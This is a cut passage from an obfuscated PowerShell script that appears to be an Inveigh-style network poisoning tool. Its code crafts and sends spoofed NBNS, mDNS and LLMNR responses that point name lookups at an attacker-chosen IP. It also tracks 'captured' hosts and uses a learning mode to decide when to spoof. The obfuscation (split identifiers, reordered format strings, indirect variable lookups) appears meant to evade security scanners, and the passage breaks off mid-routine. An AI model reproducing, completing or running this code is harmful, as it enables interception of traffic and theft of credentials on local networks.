                                    elseif(${spOOFer`HOSTsI`G`No`RE} -and ${sp`O`OF`ERH`oST`SigNore} -contains ${N`BNS_QUeRY`_`sTR`InG})
                                    {
                                        ${N`Bn`s_R`eSPOns`e_mESSA`ge} = ('- '+"$NBNS_query_string "+'i'+'s '+'on'+' '+'ign'+'ore '+'l'+'ist')
                                    }
                                    elseif(${SPo`OFerI`psREP`ly} -and ${SPoo`FERiP`SREplY} -notcontains ${soUrc`e_`Ip})
                                    {
                                        ${nbnS`_`R`eSP`oNse`_mES`SAGE} = ('- '+"$source_IP "+'i'+'s '+'no'+'t '+'on'+' '+'r'+'eply '+'li'+'st')
                                    }
                                    elseif(${sP`O`of`EripsIGN`OrE} -and ${S`poOF`erIPsigN`ore} -contains ${so`Urc`e`_ip})
                                    {
                                        ${NBn`S`_rE`sPoN`se_MES`Sa`Ge} = ('- '+"$source_IP "+'i'+'s '+'o'+'n '+'ign'+'ore '+'l'+'ist')
                                    }
                                    elseif(${nBNs_`QUERY_st`R`iNG}.("{1}{0}"-f 'im','Tr').Invoke() -eq '*')
                                    {
                                        ${nBnS`_Re`sPONsE_`Mes`sagE} = ("{3}{2}{0}{1}" -f 'NBSTAT reque','st',' ','-')
                                    }
                                    elseif(${iNV`EI`Gh}."Va`LI`D`_host_l`iST" -contains ${nb`N`s`_qU`erY_stRi`NG})
                                    {
                                        ${n`Bns_RE`sp`ONS`e_ME`ssa`ge} = ('- '+"$NBNS_query_string "+'is'+' '+'a '+'valid'+' '+'ho'+'st')
                                    }
                                    elseif(${i`NvEigH}."IP_CAp`T`UrE_L`ISt" -contains ${SOUR`cE_`IP}."iPA`ddR`Es`sT`ostRiNG")
                                    {
                                        ${nbn`S`_reS`pon`se_m`ESsAGe} = ('- '+'prev'+'ious'+' '+'cap'+'t'+'ure '+'from'+' '+"$source_IP")
                                    }
                                    elseif(${SpoOFeR`lEA`RNI`N`Gde`LaY} -and ${s`p`O`oFEr_LeArNiN`G_sT`oPwATch}."El`ApSed" -lt ${S`Po`ofeR_LEA`RniNg`_DELaY})
                                    {
                                        ${NB`Ns`_reSPo`NSE`_MEs`SA`ge} = "- " + [Int](${S`poOferLE`Ar`NinG`dE`L`AY} - ${SpOoFER`_le`ARning_St`O`pWAT`ch}."ElAps`ED"."TOtAlm`In`Ut`ES") + ("{3}{6}{0}{7}{4}{2}{1}{5}"-f'inute(s) un','fing','oo',' ',' sp',' starts','m','til')
                                    }
                                    elseif(${SOurc`E`_iP} -eq ${Ip} -and !${nbns_`l`eArn`iNG_log}.("{0}{1}"-f'Exi','sts').Invoke({param(${S}) ${s} -like "* " +  (  variabLe 5E9a -va)::"tOS`TR`ING"(${pAyLoa`D_bY`TeS}[0..1]) + " *"}))
                                    {
                                        ${n`B`Ns_rEspOnS`e_mEss`Age} = ("{2}{4}{0}{1}{3}" -f 'l',' reque','- loc','st','a')
                                    }
                                    else
                                    {
                                        ${nBNS_`Re`SP`oNSe`_`MesSaGe} = ("{4}{6}{0}{5}{3}{2}{1}"-f ' w','ong',' wr','nt','- s','e','omething')
                                    }

                                }

                            }

                            if(!${Nbns`_r`equ`ESt_`iGnorE} -and   (gEt-VaRiaBLE  5e9a -valueON  )::"toS`T`RinG"(${P`AY`lOaD_By`TES}[4..7]) -eq ("{2}{0}{1}" -f '-0','0','00-01-00'))
                            {
                                ${i`NVE`IGh}."COnSoLE`_q`U`EUE".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))

                                if(${INv`E`igh}."fiLe`_`o`UtPUT")
                                {
                                    ${inV`e`IGh}."loG`_FIlE`_`QUeUe".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))
                                }

                                if(${INVe`igh}."LOg_`Out`pUT")
                                {
                                    ${I`Nve`iGH}."l`Og".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))
                                }

                            }
                            elseif(${SPOofE`RLE`ARn`i`NG} -eq 'Y' -and  (  GEt-vARiaBLe  5e9a -VAL)::"TosT`RI`NG"(${pA`yLoAD`_`B`yteS}[4..7]) -eq ("{0}{2}{3}{1}"-f '0','1','0-00-00','-0') -and ${nBNS_l`ea`Rn`Ing_lOG}.("{1}{0}" -f'xists','E').Invoke({param(${s}) ${S} -like "* " +  (gEt-itEm  ("v"+"a"+"ria"+"BLe:5E"+"9A"))."Va`LUe"::"TOST`R`InG"(${PAylo`AD_By`T`ES}[0..1]) + " *"}))
                            {
                                [Byte[]]${nb`N`S_r`ESpONse`_i`p_byTES} = ${PaY`lOA`D`_BYtEs}[(${PAyL`OA`d_byt`ES}."L`engTH" - 4)..(${PAYloA`d`_`BY`TeS}."lEn`gtH")]
                                ${nbnS`_`RESponsE`_ip} = [System.Net.IPAddress]${Nb`Ns_reSp`ON`s`e_i`P_BYTeS}
                                ${NbNs_rEs`Pon`S`e_`ip} = ${nBNS_rE`s`pO`Nse_Ip}."IpadDr`ES`STO`ST`RINg"

                                if(${iN`Vei`gh}."ValId_`Ho`st_LiST" -notcontains ${nBns_qUer`y_`STr`i`Ng})
                                {
                                    ${i`NVE`IGH}."ValI`D`_hOsT_`l`IST".("{0}{1}"-f 'Ad','d').Invoke(${n`Bns_qu`eRY`_`sT`RINg})
                                    ${Inv`E`iGh}."Co`NSOl`E_qUEUE".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list "))

                                    if(${iN`Ve`Igh}."fILE`_`oUtPUT")
                                    {
                                        ${In`VEiGH}."lOG_`FIl`E`_q`UEUe".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list "))
                                    }

                                    if(${iNv`E`igh}."lO`g`_OuT`Put")
                                    {
                                        ${InVE`I`gH}."l`Og".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list "))
                                    }

                                }

                            }

                        }

                    }

                    5353 
                    {   
                        
                        if( ${5`e9a}::("{2}{1}{0}"-f 'String','o','T').Invoke(${P`A`yLoAD_`BYT`ES}) -like ("{1}{0}{2}{3}{4}" -f '-','*','00','-0','1-80-01'))
                        {
                            ${u`d`P_leNGth}[0] += 10
                            ${m`dN`s`_QUeRY_PAYlOAD_b`yTes} = ${pAylOad_`B`Y`TeS}[(12)..(${P`AylOAd`_By`TeS}."lEN`g`TH" - 5)]
                            ${mdNs_Q`UEr`Y`_Stri`NG} = &("{3}{2}{1}{0}" -f'ing','r','aToSt','Dat') 1 ${mDnS_QueR`y`_PaY`lo`Ad`_`ByTEs}[0] ${m`dns_`QU`ERy_P`AYL`Oad_bY`TeS}
                            ${M`dNs`_q`UEr`Y_S`TRiN`G_FUlL} = ${M`dNS_`QUery_`stRInG} + ("{1}{0}"-f'ocal','.l')

                            ${m`DNs_RESPO`N`S`e_d`AtA} = ${mD`Ns_qUer`y_pa`y`l`oa`d_`ByTeS} +
                                                    0x00,0x01,0x00,0x01 +
                                                    ${mD`NS_tt`L_byt`Es} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${sPoO`Fe`Rip})).("{0}{1}{3}{2}" -f'Get','Add','Bytes','ress').Invoke()
                        
                            ${mDNS_res`pons`E_P`A`cKET} = 0x14,0xe9 +
                                                    ${soUrce_P`O`Rt}[1,0] +
                                                    ${UDp_`LEn`gTH}[1,0] +
                                                    0x00,0x00 +
                                                    ${pA`YloAd_`BYteS}[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    ${mDnS_r`e`SP`ON`Se_dA`Ta}
                            
                            if(${MD`Ns} -eq 'Y')
                            {

                                if((!${sPOoFER`ho`sts`R`E`Ply} -or ${S`pooFeRHoS`TSR`eP`LY} -contains ${Mdns_qUErY`_s`T`R`ing}) -and (!${sPOoFerHOSt`sI`g`NORE} -or ${S`pOoFEr`HOsT`SiGno`RE} -notcontains ${mD`N`s_Qu`ery_stRInG}) -and (
                                !${S`PO`OfEr`I`PsrEplY} -or ${s`pOofERI`psRe`PlY} -contains ${so`Urc`e_iP}) -and (!${Sp`OO`FErIp`SIGnOrE} -or ${sp`oOfE`RIpS`I`G`NORE} -notcontains ${so`URC`e_IP}) -and (
                                ${in`V`EIgH}."sPooFe`R_R`ep`EaT" -or ${i`NveI`GH}."I`P`_cA`PTuRE`_lIsT" -notcontains ${so`URcE`_iP}."iP`ADD`R`eS`STOstri`Ng") -and (${Md`NStY`P`es} -contains 'QU'))
                                {
                                    ${s`en`D_sOCK`Et} = &("{0}{1}{2}" -f 'New-O','b','ject') ("{3}{1}{2}{6}{4}{5}{0}" -f 't','t','em.Net.','Sys','ets.S','ocke','Sock')(  ( dIr ('v'+'A'+'RiaB'+'lE:hf9')  )."VA`LUe"::"inTE`Rne`TWOrK", (GEt-vARiablE  ("72E"+"uq"+"x") -Va)::"R`AW", (gET-Item vaRiABLE:ZtDwx)."V`ALUe"::"u`DP" )
                                    ${S`E`Nd_`sOCket}."s`eNdB`UFFe`R`sIzE" = 1024
                                    ${DesTINa`TIO`N_`p`OI`Nt} = &("{2}{1}{0}"-f 'ct','-Obje','New') ("{4}{1}{3}{0}{2}"-f'oin','.Net.I','t','PEndp','System')(${SO`URcE_`Ip},${Endp`oI`NT_SOURce_P`orT})
                                    ${se`ND_soc`k`et}.("{1}{0}"-f'ndTo','Se').Invoke(${mdnS_`RESponSE`_PAc`k`eT},${des`TiNaTi`o`N_`pOint})
                                    ${se`Nd`_s`OcKEt}.("{1}{0}" -f'se','Clo').Invoke()
                                    ${mD`N`S_`ReS`P`on`Se_mEssAGE} = ("{0}{2}{3}{4}{1}"-f '- respon','t','se ','s','en')
                                }
                                else
                                {

                                    if(${Mdn`STY`P`eS} -notcontains 'QU')
                                    {
                                        ${MdNs`_RE`S`P`oNSE_MEsS`A`gE} = ("{4}{2}{0}{1}{3}" -f'DN','S','d m',' type','- disable')
                                    }
                                    elseif(${S`POofER`HOs`TsR`EPLy} -and ${sPO`OFerHo`STsRe`P`Ly} -notcontains ${M`DNs_qu`eRY`_StrinG})
                                    {
                                        ${mDnS_r`eSpon`sE`_`mES`s`Age} = ('- '+"$mDNS_query_string "+'i'+'s '+'n'+'ot '+'on'+' '+'rep'+'ly '+'li'+'st')
                                    }
                                    elseif(${SPo`O`FERHOStSI`G`N`ORe} -and ${SP`Ooferh`OST`sIgnORe} -contains ${MDn`S_qUE`Ry`_StrING})
                                    {
                                        ${m`DNS_`RE`s`Pon`sE`_meSsAGE} = ('- '+"$mDNS_query_string "+'i'+'s '+'o'+'n '+'ign'+'or'+'e '+'lis'+'t')
                                    }
                                    elseif(${S`pOOf`erIPS`REpLY} -and ${SPoo`FErI`Psr`ep`LY} -notcontains ${SOu`Rc`e_`IP})
                                    {
                                        ${Mdn`s_resP`ONs`E_mEs`SAGe} = ('- '+"$source_IP "+'is'+' '+'no'+'t '+'on'+' '+'rep'+'ly'+' '+'lis'+'t')
                                    }
                                    elseif(${SPOofE`Rips`IG`NORE} -and ${s`poO`Fe`RIpS`i`GnoRE} -contains ${SOUrC`e_`Ip})
                                    {
                                        ${m`dnS`_rES`poN`se_MESsA`ge} = ('- '+"$source_IP "+'is'+' '+'o'+'n '+'igno'+'re '+'li'+'st')
                                    }
                                    else
                                    {
                                        ${Md`N`s_respONSe`_m`ESSagE} = ("{1}{4}{2}{5}{3}{0}{7}{6}" -f 'vious c','- not sp','ofe','o pre','o','d due t','re','aptu')
                                    }
                                
                                }
                            
                            }

                            ${i`Nv`EiGH}."cOnS`OlE_Q`U`e`UE".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))

                            if(${i`NVeIgh}."FILe_`Out`pUT")
                            {
                                ${inv`eI`GH}."Lo`g_FilE_`que`Ue".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                            }

                            if(${iNv`ei`GH}."lOG`_`ouTPUT")
                            {
                                ${I`NvE`iGH}."L`oG".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                            }

                        }
                        elseif(  (DIr  ("VarIAbL"+"E:"+"5E9a") )."vA`Lue"::("{1}{0}" -f'oString','T').Invoke(${PaylO`Ad`_bY`T`es}) -like ("{8}{0}{4}{2}{3}{7}{6}{1}{5}"-f 'C','1','6','F-63-61-','-','-*','01-00-0','6C-00-00-','*-05-6'))
                        {
                            ${Udp_`l`ENGtH}[0] += 4
                            ${MdNs`_Query_PA`yLOa`D_bYt`eS} = ${PaY`loaD_bYT`eS}[12..(${Paylo`A`d_B`YTes}[12] + 12)]
                            ${M`dns_Q`UE`R`Y_`StRinG} = &("{1}{0}{2}"-f 'oS','DataT','tring') 1 ${md`NS`_QUE`Ry_PA`yLo`A`D_bYTeS}[0] ${mDNs`_QU`ER`Y_PAYLoA`D_`BY`T`Es}
                            ${mdNS_QU`ery`_stRINg`_f`Ull} = ${Mdns_q`Ue`R`Y_STRing} + ("{0}{1}"-f '.lo','cal')

                            ${MDNs`_REs`Pon`S`e_d`AtA} = ${m`DNS`_QUEry_PaYLOA`D`_bYtEs} +
                                                    0x05,0x6c,0x6f,0x63,0x61,0x6c,0x00 +
                                                    0x00,0x01,0x80,0x01 +
                                                    ${mdnS_TtL`_B`Ytes} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${Sp`oo`F`ErIp})).("{2}{3}{0}{1}{4}" -f 'es','sByte','Ge','tAddr','s').Invoke()

                        
                            ${mdNS_`ReS`PoNSE`_P`AcKeT} = 0x14,0xe9 +
                                                    ${sO`UR`ce_`pOrT}[1,0] +
                                                    ${U`DP_`Len`gth}[1,0] +
                                                    0x00,0x00 +
                                                    ${PaYL`oad_b`Y`TeS}[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    ${m`DN`s_r`eS`PonSe`_DATA}
                   
                            if(${MD`NS} -eq 'Y')
                            {

                                if((!${SPOoFE`R`HosTs`Re`P`LY} -or ${sPOof`eRH`Os`TSREpLY} -contains ${M`Dns`_QUe`Ry_S`TriNg}) -and (!${SPO`OFE`R`HosTSI`gnORe} -or ${SPOOFerh`o`STS`ignore} -notcontains ${MDNS_`Q`UERY_STri`Ng}) -and (
                                !${SpOoFER`Ip`s`REp`ly} -or ${SPO`OFeR`IPS`R`EPLY} -contains ${So`Ur`cE`_IP}) -and (!${SpO`o`FEri`PSIgnOrE} -or ${Sp`Oof`ErIPsi`GN`Ore} -notcontains ${sou`R`ce_ip}) -and (
                                ${iN`VE`IGh}."spo`oFEr_`R`E`PEaT" -or ${i`N`Veigh}."I`P_`cap`TurE`_LiST" -notcontains ${sO`Urce`_ip}."i`PAD`DRE`S`StOstRi`NG") -and (${M`d`NSTyPeS} -contains 'QM'))
                                {
                                    ${SENd_`soC`Ket} = &("{0}{1}{2}" -f'New-','Obj','ect') ("{3}{2}{7}{1}{6}{5}{4}{0}"-f 'ocket','m','t','Sys','S','et.Sockets.','.N','e')( (vaRiaBLE  hF9  )."vA`luE"::"Int`ernET`w`orK",  ${72`EuQX}::"R`AW", (  gI  VariabLe:ZTDwX)."val`UE"::"u`DP" )
                                    ${SE`Nd`_SOCkeT}."S`e`N`DbuFf`ersize" = 1024
                                    ${Des`TInAT`ion_P`OI`NT} = &("{0}{2}{1}" -f'Ne','Object','w-') ("{1}{2}{0}{3}{4}{5}"-f'em.Net.IPEnd','Sy','st','poi','n','t')([IPAddress]("{0}{2}{1}"-f '224','51','.0.0.2'),5353)
                                    ${SenD_`SOc`ket}.("{0}{1}{2}" -f'Sen','d','To').Invoke(${md`Ns`_`REsPo`NSE_P`ACKet},${DEs`TI`NaTIon_`Poi`Nt})
                                    ${sENd`_`S`ockeT}.("{0}{1}" -f'Clo','se').Invoke()
                                    ${md`Ns_`RE`s`P`Onse_`MesSAGe} = ("{0}{2}{3}{1}" -f '- ','t','r','esponse sen')
                                }
                                else
                                {

                                    if(${mdN`S`Types} -notcontains 'QM')
                                    {
                                        ${Mdn`s`_rESPOn`se_`mesS`A`gE} = ("{2}{6}{3}{0}{1}{4}{5}" -f'ed mDNS ','ty','- di','bl','p','e','sa')
                                    }
                                    elseif(${S`pOOf`er`hOStsre`PLY} -and ${Sp`OofErhO`s`T`sRe`pLy} -notcontains ${MdnS_qUE`Ry`_`STriNg})
                                    {
                                        ${MdN`s_RESPONSe`_`m`eSs`AgE} = ('- '+"$mDNS_query_string "+'is'+' '+'not'+' '+'on'+' '+'re'+'ply '+'l'+'ist')
                                    }
                                    elseif(${S`P`OoFeR`hO`S`TSIGNO`RE} -and ${sPo`OfERhoS`Ts`iGN`OrE} -contains ${MD`Ns_`QuEr`y`_StRinG})
                                    {
                                        ${mD`NS_rEs`P`ons`e_MESsAGe} = ('- '+"$mDNS_query_string "+'is'+' '+'o'+'n '+'ignor'+'e '+'lis'+'t')
                                    }
                                    elseif(${SPO`OFe`RIps`RePLY} -and ${S`poOFER`iPsrePly} -notcontains ${s`o`UrCe`_IP})
                                    {
                                        ${mD`Ns_rE`S`PonsE_MEs`Sage} = ('- '+"$source_IP "+'i'+'s '+'not'+' '+'o'+'n '+'re'+'ply '+'l'+'ist')
                                    }
                                    elseif(${sP`o`ofEr`ipSI`gNOrE} -and ${s`po`OfEriPsIgN`orE} -contains ${SOu`Rce`_iP})
                                    {
                                        ${md`NS_r`e`sPo`NsE_m`essaGE} = ('- '+"$source_IP "+'is'+' '+'on'+' '+'ign'+'ore '+'l'+'ist')
                                    }
                                    else
                                    {
                                        ${m`DNs_ResPoN`s`E`_MEssA`GE} = ("{5}{2}{1}{4}{6}{3}{0}"-f 'e','poofed due to prev',' not s','r','ious cap','-','tu')
                                    }
                                
                                }
                            
                            }

                            ${i`N`VEIGh}."cON`sole_`Q`Ue`UE".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))

                            if(${INV`ei`gH}."f`IL`E_OUT`PuT")
                            {
                                ${InVe`i`GH}."log_Fi`l`E_Q`Ueue".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                            }

                            if(${I`N`VeiGh}."LOg`_ou`TPUT")
                            {
                                ${iNv`Ei`gh}."L`oG".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                            }

                        }
                        
                    }

                    5355 
                    {

                        if( ${5`E9A}::"to`StRi`NG"(${pAy`L`oAD_ByT`eS}[(${Pa`Ylo`Ad`_`ByTes}."LEn`GTH" - 4)..(${PA`yLOAD_`By`TES}."lEn`G`Th" - 3)]) -ne ("{1}{0}"-f '1c','00-')) 
                        {
                            ${u`D`p_`lengTH}[0] += ${paYloAd`_BY`T`es}."LEn`GTh" - 2
                            ${ll`mNR_ResPONSE`_d`Ata} = ${p`AyLO`A`D_byTEs}[12..${pa`Y`load_`B`YtES}."LEn`GTh"]

                            ${LlMnR`_`Res`PoN`se_d`Ata} += ${LL`Mn`R_REs`P`ONSE`_data} +
                                                    ${LlMNr_ttl_`B`y`TEs} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${SpOo`Fe`Rip})).("{2}{1}{0}{4}{3}" -f's','etAddres','G','ytes','B').Invoke()
            
                            ${ll`mNr_REsp`o`NS`E_pAckET} = 0x14,0xeb +
                                                        ${Sou`RC`e_p`oRT}[1,0] +
                                                        ${UDP_`l`engTH}[1,0] +
                                                        0x00,0x00 +
                                                        ${pa`yLoAd`_BYteS}[0,1] +
                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                        ${L`L`M`Nr_rE`SPoNsE_dAtA}
                
                            ${ll`m`NR_QU`ery} =   (GeT-vAriabLE  5E9A)."V`ALue"::"toS`TR`iNg"(${PayLoAD_`B`yt`Es}[13..(${paY`lo`Ad_`B`YTES}."L`E`NGTH" - 4)])
                            ${L`LMNr`_`QueRy} = ${Ll`MN`R_Q`UERY} -replace "-00",""

                            if(${l`lMNR`_`queRY}."l`ENGTh" -eq 2)
                            {
                                ${LlMnr`_`query} = [Char] ( DIR vaRiablE:vwE  )."v`ALUE"::("{0}{1}" -f 'ToInt','16').Invoke(${LlmNr`_q`UE`RY},16)
                                ${L`lmnr_QuEry_sT`Ri`NG} = &("{0}{1}{2}"-f'N','ew','-Object') ("{1}{3}{2}{0}"-f'tring','Sys','S','tem.')(${l`LmNR_`q`UeRY})
                            }
                            else
                            {
                                ${L`l`Mnr_qUerY} = ${l`lmNr_q`Uery}.("{0}{1}"-f'Spli','t').Invoke("-") | &("{4}{3}{0}{1}{2}" -f'Ea','ch-Ob','ject','r','Fo'){[Char] (  gET-itEm  variaBLE:VwE)."va`LuE"::("{0}{1}" -f'ToIn','t16').Invoke(${_},16)}
                                ${lL`mNR`_Q`U`er`Y_sTRINg} = &("{2}{0}{1}"-f'w-O','bject','Ne') ("{0}{1}{3}{2}" -f'System.','St','g','rin')(${L`lm`NR_QU`Ery},0,${lLM`Nr_QUe`Ry}."leNg`TH")
                            }

                            ${L`L`mNr_REqu`e`ST_I`GnorE} = ${Fal`se}
                
                            if(${ll`mNr} -eq 'Y')
                            {

                                if(${spO`o`FerLEarN`I`NG} -eq 'Y' -and ${in`V`eigH}."vaLID`_HOsT_`lIsT" -notcontains ${l`lMN`R_QU`eRY_s`TRinG} -and ${soUrCE`_`IP} -ne ${I`p})
                                {

                                    if((${l`l`mnR_L`EaRn`I`Ng_log}.("{1}{0}" -f'xists','E').Invoke({param(${s}) ${s} -like ('20*'+' '+"$LLMNR_query_string")})))
                                    {
                                        ${llMNR`_lEarNin`g_Q`UE`U`E_TIME} = [DateTime]${LLMNR`_Le`ARNin`G_`LoG}.("{1}{0}" -f 'ind','F').Invoke({param(${S}) ${s} -like ('20*'+' '+"$LLMNR_query_string")}).("{2}{3}{1}{0}" -f'g','n','Sub','Stri').Invoke(0,19)

                                        if((&("{1}{0}" -f 'te','Get-Da')) -ge ${l`LmN`R`_leArnINg_q`UeUe_TimE}.("{1}{0}{2}"-f 'M','Add','inutes').Invoke(${Spo`O`FE`RL`EA`RnI`NGinTeRv`AL}))
                                        {
                                            ${llM`Nr_l`EArni`Ng`_L`OG}.("{1}{2}{0}"-f 'veAt','R','emo').Invoke(${L`lmn`R_L`eArn`Ing_L`og}.("{1}{0}{2}" -f 'e','FindInd','x').Invoke({param(${s}) ${S} -like ('20'+'* '+"$LLMNR_query_string")}))
                                            ${llMn`R_`lEaRN`in`G_`se`ND} = ${T`Rue}
                                        }
                                        else
                                        {
                                            ${Ll`M`Nr_L`E`AR`NinG`_SEnD} = ${fAl`sE}
                                        }

                                    }
                                    else
                                    {           
                                        ${Ll`M`Nr_`Learni`Ng_sE`ND} = ${Tr`Ue}
                                    }

                                    if(${llM`N`R_L`eaR`NInG_`s`enD})
                                    {
                                        ${Ll`mNR_`TraN`sACT`I`On_ID} = [String](1..2 | &("{2}{0}{3}{1}"-f'rE','Object','Fo','ach-') {"{0:X2}" -f (&("{2}{0}{3}{1}"-f 'et-R','dom','G','an') -Minimum 1 -Maximum 255)})
                                        ${L`L`mN`R_Tr`A`NS`AcTIo`N_id`_byteS} = ${llmn`R_Tr`AN`sActI`on_ID}.("{0}{1}" -f'Sp','lit').Invoke(" ") | &("{0}{1}{2}"-f 'ForE','ach','-Object'){[Char] ( cHIlditEm ("V"+"a"+"RIab"+"le:VWE") )."Val`UE"::("{0}{1}" -f'To','Int16').Invoke(${_},16)}
                                        ${LlMNr_T`RANsacti`o`N_`id} = ${Ll`MnR_`TR`AnSA`C`TIoN_`iD} -replace " ","-"
                                        ${LlmnR_u`D`p_`cLi`E`Nt} = &("{1}{0}{2}"-f'b','new-O','ject') ("{2}{0}{4}{3}{5}{1}"-f'kets','ient','System.Net.Soc','C','.Udp','l')
                                        ${l`lmN`R_hOS`Tn`Am`e`_BYTES} = ${pA`YLoAd_`B`yT`Es}[13..(${pAyl`OaD`_BytEs}."l`ENGth" - 5)]

                                        ${llMN`R`_REqUE`S`T_pAc`keT} = ${Llm`Nr_T`RANSA`Ct`ION_I`D_bYT`Es} +
                                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                                (${lLmnR_`Host`Na`Me_bYt`ES}."le`Ngth" - 1) +
                                                                ${lLmN`R_H`O`StNa`mE_byTes} +
                                                                0x00,0x01,0x00,0x01

                                        ${llM`Nr`_`L`eAR`Ni`NG_desti`Na`TION`_EnDpoiNT} = &("{2}{1}{0}"-f 'bject','O','New-') ("{4}{0}{2}{5}{6}{1}{3}" -f 'y','p','stem.Net.','oint','S','IP','End')([IPAddress]("{0}{3}{1}{2}" -f '224','0.','252','.0.'),5355)
                                        ${lL`m`NR_`Udp`_CL`iEnT}.("{1}{0}"-f'onnect','C').Invoke(${lLMnr`_LeaRNI`N`g_dE`STINAtION_End`POI`Nt})
                                        ${lL`m`NR`_U`dp_Cl`IeNT}.("{0}{1}" -f'Sen','d').Invoke(${Ll`Mnr_R`eq`Ue`St_PaCk`eT},${LlMNR_r`equeSt_`pACk`et}."lE`NGtH")
                                        ${LL`Mnr`_`UdP`_cLIeNt}.("{0}{1}"-f 'Clo','se').Invoke()
                                        ${L`lmNR_`LeARNING`_LoG}.("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') $LLMNR_transaction_ID $LLMNR_query_string "))
                                        ${i`N`VeIgh}."cONs`O`le_`QuEue".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252 "))

                                        if(${I`NvEI`Gh}."fil`E_oU`TpUT")
                                        {
                                            ${inv`eiGh}."Lo`g_fIlE_qu`Eue".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252 "))
                                        }

                                        if(${In`V`EigH}."LOg_`o`UtPUt")
                                        {
                                            ${in`VeIgH}."L`OG".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252 "))
                                        }

                                    }

                                }

                                if((${i`NV`EiGh}."VA`LI`D_`hOst`_List" -notcontains ${L`lM`NR_queR`y_striNG} -or ${S`P`Oo`FERH`osTsREPlY} -contains ${l`lm`NR_QuEry_S`T`RInG}) -and (!${spo`OF`Erho`stsREp`ly} -or ${SPOofE`RHos`Tsrep`lY} -contains ${l`l`MNR_`Q`UERy_sTRInG}) -and (
                                !${spo`OFeR`hoS`TsIGNORE} -or ${s`p`oofE`RHos`TsIgn`ORE} -notcontains ${LLmnR_Q`U`eR`y`_`STrInG}) -and (!${sPoofEr`i`P`s`RePLy} -or ${SpooFeR`Ip`Sr`e`PLy} -contains ${SOUr`c`e_iP}) -and (
                                !${sp`ooFeR`IpsiG`N`oRe} -or ${S`pO`OferiPSIg`NORe} -notcontains ${so`UrCe_`Ip}) -and (${I`N`VeIgH}."spo`O`FEr_`REPe`At" -or ${I`NV`eigh}."i`P_CaPTU`Re_L`iSt" -notcontains ${sOUr`ce_`ip}."iPADD`Re`ss`T`oSTRInG") -and (
                                ${SpoOFe`Rl`eARNi`Ng} -eq 'N' -or (${SPo`ofEr`l`Ea`RNing} -eq 'Y' -and !${s`Poo`FE`R`LeaRNi`N`GDELAy}) -or (${S`p`OoF`ErLeArN`i`NGDelAY} -and ${spOof`ER`_lEaRnING`_STop`W`At`CH}."El`AP`SEd" -ge ${S`POoF`ER_lE`ARnING_`del`Ay})))
                                {

                                    if(${SPoofeRLE`AR`N`InG} -eq 'N' -or !${lLMn`R_`L`E`AR`NiNg_Log}.("{1}{0}"-f 'sts','Exi').Invoke({param(${S}) ${s} -like "* " +  ${5`E9A}::"TOS`T`RiNG"(${p`AYlOAd`_ByT`ES}[0..1]) + " *"}))
                                    {
                                        ${llM`Nr`_s`ENd_SOcket} = &("{0}{2}{1}"-f 'Ne','ect','w-Obj') ("{0}{1}{4}{2}{3}"-f 'Sys','t','m.Net.Sockets.S','ocket','e')(  (gCi vArIable:hF9  )."V`ALue"::"I`N`TerneT`WorK",  (  VariAble ("7"+"2EuQX")  )."va`LUe"::"R`Aw",  ( IteM vArIABLE:ZTDWX )."vaL`UE"::"U`DP" )
                                        ${LLm`N`R_SEND_S`ocK`eT}."se`NDB`UF`F`erSize" = 1024
                                        ${llmnr_dEs`T`INaT`I`o`N_`POINT} = &("{3}{2}{0}{1}" -f 'c','t','-Obje','New') ("{3}{2}{0}{1}" -f'em.Net.IPEn','dpoint','st','Sy')(${souRC`E`_IP},${e`NdP`OINt`_SOur`ce_`P`orT}) 
                                        ${lLmNR_sEN`D`_`SoCKET}.("{0}{1}" -f'Sen','dTo').Invoke(${lLMNr`_`RESPonSe`_Pa`c`KET},${LlMNR`_`dES`TinaTIO`N`_poI`NT})
